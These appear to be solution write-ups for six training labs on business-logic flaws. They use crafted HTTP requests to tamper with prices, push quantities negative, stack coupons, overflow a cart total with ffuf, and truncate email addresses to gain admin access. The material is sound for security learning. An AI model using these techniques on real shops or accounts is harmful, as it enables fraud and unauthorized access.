
# Lab 1

## Description

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

Going through the buying process shows following request:

```
POST /cart HTTP/2
Host: 0ad900c004109d418193a7eb0015006c.web-security-academy.net
[...]

productId=1&redir=PRODUCT&quantity=1&price=133700
```

The `price` parameter is user controlled which could let us change the buying price. Testing this theory by emptying the cart (if it's not empty) and sending the wanted price with:

```
POST /cart HTTP/2
Host: 0ad900c004109d418193a7eb0015006c.web-security-academy.net
[...]

productId=1&redir=PRODUCT&quantity=1&price=50
```

which adds the jacket to the cart at a price of `0.50$`. Placing an order on the product solves the lab.


# Lab 2

## Description

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

Testing as before shows that the add to cart request lacks the `price` parameter. Adding it doesn't change the price because the backend ignores it. An interesting behavior shows when adding negative `quantity` to the cart. This removes one item from the cart but doesn't stop at 0. Trying to "buy" negative amounts of a product (essentially trying to get paid) doesn't work because the checkout price shouldn't be less than 0. With that in mind, one can add a negative amount of a second product to act as a discount until the price is low enough (still above 0), then checkout and buy the desired item. This method solves the lab.



# Lab 3

## Description

This lab's flawed logic allows arbitrary users to access administrative functionality that should only be available to company employees. To solve the lab, access the admin panel and delete the user `carlos`.

## Solution

Use the provided mail client to register with any user like:

```
attacker:test
```

Login to the new account and change the email address to:

```
attacker@dontwannacry.com
```

as the register page suggests using. Access the admin panel via `/admin` and delete user carlos, this solves the lab.



# Lab 4

## Description

This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

The banner:

```
New customers use code at checkout: NEWCUST5
```

Signup to newsletter:

```
SIGNUP30
```

Add jacket to cart then go to checkout and add a coupon then the other then the first again -> it stacks. Alternate between the two codes until affordable and purchase. This solves the lab.



# Lab 5

## Description

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

The cart price in an integer which loops back to negative values if maximum integer value is hit. The hint tells us to use intruder (turbo) but we can do it with a well regulated `ffuf` instead. Save the `add to cart` request to a file, add a fake HTTP param to it:

```
[...]
productId=1&quantity=99&redir=CART&dummy=FUZZ
```

**Note:** the `quantity` value max is `99`.

then create a wordlist with:

```
seq 1 500 > range.txt
```

and run:

```
ffuf -request add-cart-logic5.req -w range.txt -t 1 -mc 200
```

`-mc 200` is purely to reduce noise of `301` redirects.


While `ffuf` runs refresh the page to look at the price vs number of requests.

After some trial and error:

```
|Name|Price|Quantity||
|---|---|---|---|
|[Lightweight "l33t" Leather Jacket](https://0a3500bc0392a84a81c61b5d002800e5.web-security-academy.net/product?productId=1)|$1337.00|32123||
|[Pest Control Umbrella](https://0a3500bc0392a84a81c61b5d002800e5.web-security-academy.net/product?productId=2)|$93.45|14||

|Total:|$86.34|
|---|---|
```

solves the lab.

# Lab 6

## Description

This lab doesn't adequately validate user input. You can exploit a logic flaw in its account registration process to gain access to administrative functionality. To solve the lab, access the admin panel and delete the user `carlos`.

You can use the link in the lab banner to access an email client connected to your own private mail server. The client will display all messages sent to `@YOUR-EMAIL-ID.web-security-academy.net` and any arbitrary subdomains. Your unique email ID is displayed in the email client.

## Solution

It seems the `email` parameter gets truncated at 255 characters. Using:

```
attackerzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassssssssssssssssssssssssssssssssss%40dontwannacry.com.exploit-0a1a006c03280907808752ef012c0048.exploit-server.net
```

shows up as:

```
attackerzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassssssssssssssssssssssssssssssssss@dontwannacry.com.e
```

on profile. 

Note: the `@` sign converted as `%40` in URL is counted as 1 character (backend reads URL decoded).

adding 2 chars:

```
attackerzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassssssssssssssssssssssssssssssssssss%40dontwannacry.com.exploit-0a1a006c03280907808752ef012c0048.exploit-server.net
```

and registering shows:

```
attackerzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassssssssssssssssssssssssssssssssssss@dontwannacry.com
```

on profile. The link to the admin panel is also present in contrast to a non-`dontwannacry` signup.

Heading to the admin panel and deleting the user `carlos` solves the lab.


